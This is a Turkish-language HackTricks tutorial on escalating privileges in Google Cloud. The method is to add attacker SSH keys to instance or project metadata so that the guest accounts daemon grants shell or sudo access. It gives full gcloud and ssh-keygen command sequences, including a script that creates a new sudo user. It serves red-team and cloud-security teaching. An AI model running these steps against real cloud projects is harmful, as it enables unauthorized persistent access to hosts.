# GCP - Özel SSH Meta Verisi Ekleme

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahraman olmak için AWS hackleme öğrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family)
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)'ı **takip edin**.
* Hacking hilelerinizi göndererek HackTricks ve HackTricks Cloud github reposuna **PR göndererek** hilelerinizi paylaşın.

</details>

## Meta verisinin değiştirilmesi <a href="#modifying-the-metadata" id="modifying-the-metadata"></a>

Bir örneğin meta verilerinin değiştirilmesi, **bir saldırganın gerekli izinlere sahip olması durumunda önemli güvenlik risklerine yol açabilir**.

### **Özel Meta Verilerine SSH Anahtarlarının Eklenmesi**

GCP'de, **Linux sistemleri** genellikle [Google Compute Engine için Python Linux Konuk Ortamı](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts) tarafından betikler çalıştırır. Bunun önemli bir bileşeni, **yetkilendirilmiş SSH genel anahtarlarının güncellemelerini düzenli olarak kontrol etmek** için örnek meta veri uç noktasını denetleyen [hesaplar daemonu](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts)'udur.

Bu nedenle, bir saldırgan özel meta verileri değiştirebilirse, daemon yeni bir genel anahtar bulacak ve bu anahtar **yerel sisteme entegre edilecektir**. Anahtar, mevcut bir kullanıcının `~/.ssh/authorized_keys` dosyasına veya anahtarın biçimine bağlı olarak **sudo ayrıcalıklarına sahip yeni bir kullanıcı oluşturulmasına** eklenecektir. Ve saldırgan, ana bilgisayarı ele geçirebilecektir.

### **Varolan ayrıcalıklı kullanıcıya SSH anahtarı eklemek**

1. **Örnekteki Varolan SSH Anahtarlarını İnceleyin:**
- Örneği ve meta verilerini açıklayan komutu çalıştırarak mevcut SSH anahtarlarını bulun. İlgili bölüm çıktıda `metadata` altında olacak, özellikle `ssh-keys` anahtarı.
```bash
gcloud compute instances describe [INSTANCE] --zone [ZONE]
```
- SSH anahtarlarının biçimine dikkat edin: kullanıcı adı, iki nokta üst üste ile ayrılan anahtarın önünde yer alır.

2. **SSH Anahtar Meta Verisi İçin Bir Metin Dosyası Hazırlayın:**
- Kullanıcı adlarının ve bunlara karşılık gelen SSH anahtarlarının ayrıntılarını `meta.txt` adlı bir metin dosyasına kaydedin. Bu, yeni anahtarları eklerken mevcut anahtarları korumak için önemlidir.

3. **Hedef Kullanıcı İçin Yeni Bir SSH Anahtarı Oluşturun (bu örnekte `alice`):**
- Yeni bir SSH anahtarı oluşturmak için `ssh-keygen` komutunu kullanın ve yorum alanının (`-C`) hedef kullanıcı adıyla eşleştiğinden emin olun.
```bash
ssh-keygen -t rsa -C "alice" -f ./key -P "" && cat ./key.pub
```
- Yeni genel anahtarı, örneğin meta verilerinde bulunan formata benzeyerek `meta.txt`'ye ekleyin.

4. **Örneğin SSH Anahtar Meta Verisini Güncelleyin:**
- Güncellenmiş SSH anahtar meta verisini `gcloud compute instances add-metadata` komutunu kullanarak örneğe uygulayın.
```bash
gcloud compute instances add-metadata [INSTANCE] --metadata-from-file ssh-keys=meta.txt
```

5. **Yeni SSH Anahtarı Kullanarak Örneğe Erişin:**
- Yeni anahtar kullanarak SSH ile örneğe bağlanın ve hedef kullanıcının bağlamında kabuğa erişin (bu örnekte `alice`).
```bash
ssh -i ./key alice@localhost
sudo id
```

### **Yeni bir ayrıcalıklı kullanıcı oluşturun ve bir SSH anahtarı ekleyin**

Eğer ilginç bir kullanıcı bulunamazsa, `sudo` ayrıcalıklarına sahip yeni bir kullanıcı oluşturmak mümkündür:
```bash
# define the new account username
NEWUSER="definitelynotahacker"

# create a key
ssh-keygen -t rsa -C "$NEWUSER" -f ./key -P ""

# create the input meta file
NEWKEY="$(cat ./key.pub)"
echo "$NEWUSER:$NEWKEY" > ./meta.txt

# update the instance metadata
gcloud compute instances add-metadata [INSTANCE_NAME] --metadata-from-file ssh-keys=meta.txt

# ssh to the new account
ssh -i ./key "$NEWUSER"@localhost
```
### Proje düzeyinde SSH anahtarları <a href="#sshing-around" id="sshing-around"></a>

Bir bulut ortamında **proje düzeyinde SSH erişimini genişletmek** için SSH anahtarlarını proje düzeyine uygulamak mümkündür. Bu yaklaşım, proje genelinde SSH erişimine izin veren herhangi bir örneğe SSH erişimine olanak tanır. İşte özetlenmiş bir rehber:

1. **Proje Düzeyinde SSH Anahtarları Uygulama:**
- `gcloud compute project-info add-metadata` komutunu kullanarak `meta.txt` dosyasındaki SSH anahtarlarını projenin meta verilerine ekleyin. Bu işlem, SSH anahtarlarının projedeki tüm örneklerde tanınmasını sağlar, ancak bir örnekte "Proje genelinde SSH anahtarlarını engelle" seçeneği etkinleştirilmişse bu durum geçerli olmaz.
```bash
gcloud compute project-info add-metadata --metadata-from-file ssh-keys=meta.txt
```

2. **Proje Genelinde Anahtarları Kullanarak Örneklerde SSH Yapma:**
- Proje genelinde SSH anahtarları kullanıldığında, projenin herhangi bir örneğine SSH yapabilirsiniz. Proje genelinde anahtarları engellemeyen örnekler, SSH anahtarını kabul ederek erişim sağlar.
- Bir örneğe doğrudan SSH yapmanın bir yolu, `gcloud compute ssh [ÖRNEK]` komutunu kullanmaktır. Bu komut, mevcut kullanıcı adınızı ve projenin düzeyinde ayarlanan SSH anahtarlarını kullanarak erişim denemesi yapar.


# Referanslar
* [https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/](https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahraman olmak için AWS hackleme öğrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'i keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya bizi **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'da** takip edin.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek** paylaşın.

</details>
